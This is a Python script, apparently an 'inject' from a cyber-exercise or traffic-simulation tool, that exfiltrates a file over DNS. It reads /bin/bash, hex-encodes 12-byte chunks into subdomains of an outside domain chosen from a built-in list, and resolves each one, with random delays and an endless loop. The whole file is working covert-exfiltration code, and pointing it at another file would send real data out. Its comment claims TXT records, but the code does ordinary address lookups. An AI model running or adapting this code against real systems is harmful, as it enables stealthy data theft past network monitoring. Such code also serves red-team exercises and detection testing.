import random
import socket
import os
import sys
import socket, time, traceback
import base64
import json

class dns_exfil():
    def __init__(self):
        self.name = "DNS Exfiltration"
        self.description = "An inject to exfiltrate a file over DNS TXT records"
        self.variables = {'domain_name': '',
                          'domain_name_OPTION': [
                                'elaze.fofreg.net',
                                'cubq.lompd.com',
                                'szepor.aqua.biz',
                                'lauoy.lamirp.gov',
                                'rimex.naoco.mil',
                                'gof.fork.net',
                                'bulc.deirf.com',
                                'yusef.tnirp.gov',
                                'avocent.netduck.edu',
                                'rules.app.net',
                                'hedge.picuz.ru',
                                'ocat.blue.cn',
                                'cybex.xmr.ru',
                                'priual.prong.mil',
                                'fog.zip.cz',
                                'pho.erf.fr',
                                'noita.gnit.md',
                                'xn.node.ir',
                                'slianted.yrotirr.tk',
                                'tarabh.aidni.pw',
                                'cibara.rebotcot.rs',
                                'mano.rataq.ge',
                                'kugnah.nadas.ua',
                                'nar.zaq.cn'],
                          'src_ws': ''}
        self.domain_name = ''
        self.filename = '/bin/bash'

    def client(self, **kwargs):
        domain = ''
        if 'domain_name' in kwargs and len(kwargs['domain_name']) > 0:
            domain = kwargs['domain_name']
        else:
            domain = kwargs['domain_name_OPTION']

        contents = ""
        with open(self.filename, "rb") as fin:
            contents = fin.read()

        # split string into chunks
        chunk_size = 12
        chunks = [contents[i:i+chunk_size] for i in range(0, len(contents), chunk_size)]

        while True:
            try:
                for chunk in chunks:
                    # Send the next chunk
                    # [uniqueID].[chunk_num].[chunk].domain
                    subdomain = '.'.join((chunk.encode('hex'), domain))
                    #print subdomain
                    try:
                        socket.gethostbyname(subdomain)
                    except:
                        pass
                    waittime = random.randint(0,5)
                    time.sleep(waittime)

                time.sleep(random.randint(10,20))
            except:
                sys.stderr.write(traceback.format_exc())
                sys.stderr.write('\n')
                break

    def run(self, **kwargs):
        self.client(**kwargs)

if __name__ == '__main__':
    import base64
    import json
    args = json.loads(base64.urlsafe_b64decode(sys.argv[1]))
    dns_exfil().run(**args)
